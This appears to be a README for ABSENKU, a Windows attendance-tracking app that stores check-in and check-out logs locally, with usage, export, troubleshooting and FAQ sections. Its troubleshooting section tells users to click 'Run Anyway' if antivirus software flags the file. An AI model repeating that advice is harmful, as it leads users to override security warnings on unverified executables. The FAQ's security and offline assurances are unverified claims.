## 📌 About this app

ABSENKU helps you manage daily attendance records. You can log check-in and check-out times for your team or personal tracking. The app stores all data locally on your computer. You do not need an internet connection to use the core features. It runs on the Windows operating system. The interface uses a simple layout to ensure you find the tools you need without confusion.

Your computer must meet these basic requirements to run ABSENKU:

*   Processor: 1 GHz or faster
*   Memory: 2 GB of RAM or more
*   Storage: 100 MB of free disk space

## ⚙️ Using the software

When you open the app for the first time, the main dashboard shows your current log. To register a new person, click the Add User button. Enter the full name and choose a unique ID number.

To record attendance, select a name from the list and click the Check In button. The app stamps the exact time from your system clock. When the day ends, select the same name and click Check Out. The system calculates the total hours worked automatically.

## 📊 Managing your records

You can export your data as a spreadsheet file. This allows you to open your attendance logs in programs such as Microsoft Excel or Google Sheets. To do this, go to the File menu and select Export Data. Choose a location on your computer to save the file. The app saves this as a common file type to ensure compatibility with most software.

## 🛠 Troubleshooting common issues

If the application does not start, check these items:

*   Make sure you have administrative rights on your user account.
*   Check if your antivirus software flagged the file. You may need to click Run Anyway if a prompt appears during launch.
*   Ensure your version of Windows stays up to date.
*   Restart your computer if the app remains unresponsive after the first launch.

If you lose your data, you can restore files from a manual backup. The application saves logs in the Documents folder by default. Copy your settings file to a safe location once per week to prevent data loss.

## ❓ Frequently asked questions

Do I need to sign up for an account?
No, you do not need to connect to any online service. All your data stays on your local hard drive.

Is my data secure?
Yes, the app keeps your information inside your computer. Nobody else can access your logs unless they have physical access to your device.

Does the app work offline?
Yes, the app does not reach out to the internet for any tasks. You can use it in areas without network coverage.

How do I remove the app?
Open the Settings menu in Windows and go to Apps. Find ABSENKU in the list and click Uninstall. This process removes the program files from your system.

Can I track multiple groups?
Yes, you can create separate folders for different teams. Use the Settings menu to change the data folder location for each group.
